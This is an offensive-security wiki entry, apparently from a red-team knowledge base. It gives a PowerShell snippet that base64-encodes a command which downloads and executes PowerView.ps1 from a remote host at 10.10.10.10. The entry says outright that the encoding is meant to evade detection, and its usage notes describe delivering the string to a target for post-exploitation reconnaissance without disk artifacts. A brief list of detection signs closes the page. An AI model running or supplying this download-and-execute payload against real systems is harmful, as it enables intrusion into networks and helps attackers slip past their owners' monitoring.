---
id: 9a9a8457-a2d0-4005-bd1a-6c0bd0f081a3
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:24.011955+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - powershell
  - encoding
  - obfuscation
validated: true
---

# PowerShell-Encode-Download-Command

## Code

```ps1
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

## Description

This PowerShell code snippet generates a base64-encoded version of a command that downloads and executes the PowerView script from a remote URL using IEX and Net.WebClient. It uses Unicode encoding to match PowerShell's default, enabling obfuscated execution via -EncodedCommand to evade detection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $command | The raw PowerShell command to encode | 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' |
| URL in $command | Attacker's server hosting PowerView.ps1 | http://10.10.10.10/PowerView.ps1 |

## Usage

Run this on the attacker's machine to generate the encoded string, then deliver it to the target for execution with powershell.exe -EncodedCommand. Useful in post-exploitation for loading reconnaissance tools without disk artifacts.

## Detection

- PowerShell logs showing base64 decoding and WebClient usage.
- Network traffic to external IPs for .ps1 downloads.
- EDR alerts on IEX with remote content.

## Related

- [[procedures/Download-and-Execute-PowerView-for-AD-Reconnaissance]]
- [[tools/PowerView]]
